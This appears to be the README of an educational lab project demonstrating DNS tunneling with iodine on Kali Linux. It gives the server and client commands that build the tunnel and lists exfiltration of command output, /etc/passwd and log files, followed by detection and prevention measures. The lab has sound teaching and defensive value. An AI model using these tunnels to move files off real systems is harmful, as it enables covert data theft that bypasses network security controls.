**Data Stealing Using DNS Tunneling**

This project demonstrates how attackers can exploit the DNS protocol to steal data from a compromised system using DNS tunneling. The exercise highlights the misuse of DNS, a critical service for resolving domain names, to covertly bypass security measures.


**Tools & Technologies:**

Operating System: Kali Linux

Tools: iodine

Environment: Virtualized environment for secure testing and execution


**Attack Simulation Steps:**

**Setup the DNS Server:**

Deployed iodine on Kali Linux to create a DNS tunnel.

Command: **sudo iodined -f -c -P password 192.168.1.1 fake-domain.org**

**Setup the DNS Client:**

Configured the client to connect to the DNS server using iodine.

Command: **sudo iodine -f -P password -T A 192.168.1.1 fake-domain.org**


**Data Exfiltration:**

Executed various methods to stealthily transfer data through the DNS tunnel:

Method 1: Transferred the output of system commands.

Method 2: Transferred sensitive files such as /etc/passwd.

Method 3: Transferred system log files.


**Mitigation:**


**Detection:** Monitored DNS traffic using tools like Wireshark.

**Prevention:** Implemented DNS filtering and anomaly detection systems to block unauthorized DNS queries.

**Outcome:** Demonstrated how DNS tunneling can be exploited for covert data exfiltration and the importance of robust DNS security measures to detect and mitigate such attacks.



**Note:** All documents related to this project are included in the repository for detailed context and instructions.


**How to Use:**

Download and review the Learning Objective and Lab Manual documents for context, instructions, and mitigation strategies.

Set up the environment using the provided Bash scripts to simulate the DNS tunneling attack.

View the PowerPoint Presentation for a summary and educational overview of the project.


**Disclaimer:
This project is intended for educational purposes only. Unauthorized use of this code in real-world systems is illegal and unethical.**
